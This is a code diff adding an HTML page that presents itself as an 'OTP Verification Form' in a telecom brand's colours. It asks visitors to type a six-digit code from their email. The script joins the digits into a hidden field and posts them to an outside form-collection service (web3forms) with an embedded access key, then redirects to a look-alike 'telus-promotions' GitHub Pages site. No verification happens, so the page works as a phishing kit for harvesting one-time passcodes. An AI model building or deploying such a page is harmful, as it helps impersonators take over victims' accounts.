@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification Form</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --primary: #54595F;
+  --light: #F7F7F8;
+  --dark: #2A2C2E;
+  --border: #D8D8D8;
+  --accent-purple: #4B286D;
+  --accent-green: #66CC00;
+  --accent-green-dark: #2B8000;
+}
+* {margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+body {background:var(--light);height:100vh;}
+.overlay {position: fixed;top:0;left:0;width:100%;height:100%;background: rgba(0,0,0,0.45);display:flex;justify-content:center;align-items:center;}
+.popup {background:#fff;padding:30px;border-radius:16px;width:360px;text-align:center;box-shadow:0 15px 40px rgba(0,0,0,0.12);border:1px solid var(--border);position:relative;}
+.popup::before {content:"";position:absolute;top:0;left:0;width:100%;height:5px;background:linear-gradient(90deg,var(--accent-purple),var(--accent-green));}
+h2 {margin-bottom:10px;color:var(--dark);}
+.note {font-size:13px;color:var(--primary);margin-bottom:20px;}
+.otp-inputs {display:flex;justify-content:space-between;margin-bottom:20px;}
+.otp-inputs input {width:45px;height:50px;text-align:center;font-size:18px;border:1px solid var(--border);border-radius:8px;}
+.submit-btn {width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(135deg,var(--accent-green),var(--accent-green-dark));color:white;font-size:15px;cursor:pointer;}
+.submit-btn:hover {opacity:0.9;}
+</style>
+</head>
+<body>
+
+<div class="overlay">
+  <div class="popup">
+
+    <!-- FORM3 FORM -->
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+      <!-- REQUIRED ACCESS KEY -->
+      <input type="hidden" name="access_key" value="c841441f-ccd5-4e32-a553-e7bc59eda8ea">
+
+      <!-- REQUIRED NAME FIELD -->
+      <input type="hidden" name="name" value="OTP User">
+
+      <h2>Enter OTP</h2>
+      <p class="note">Please check your email for the verification code.</p>
+
+      <!-- OTP Inputs -->
+      <div class="otp-inputs">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+        <input type="text" maxlength="1" required pattern="[0-9]">
+      </div>
+
+      <!-- Hidden OTP combined -->
+      <input type="hidden" name="message" id="fullOtp">
+
+      <!-- Optional redirect after success -->
+      <input type="hidden" name="redirect" value="https://telus-promotions.github.io/our-plans/">
+
+      <button type="submit" class="submit-btn">Verify & Continue</button>
+    </form>
+
+  </div>
+</div>
+
+<script>
+const inputs = document.querySelectorAll(".otp-inputs input");
+const fullOtp = document.getElementById("fullOtp");
+
+// Auto-focus between inputs
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    input.value = input.value.replace(/[^0-9]/g,'');
+    if(input.value && index < inputs.length-1) inputs[index+1].focus();
+    updateOTP();
+  });
+  input.addEventListener("keydown", e => {
+    if(e.key==="Backspace" && !input.value && index>0) inputs[index-1].focus();
+  });
+});
+
+function updateOTP() {
+  let otp = "";
+  inputs.forEach(input => otp += input.value);
+  fullOtp.value = "OTP: " + otp; // Form3 reads this
+}
+
+// Focus first input
+window.onload = () => inputs[0].focus();
+</script>
+
+</body>
+</html>
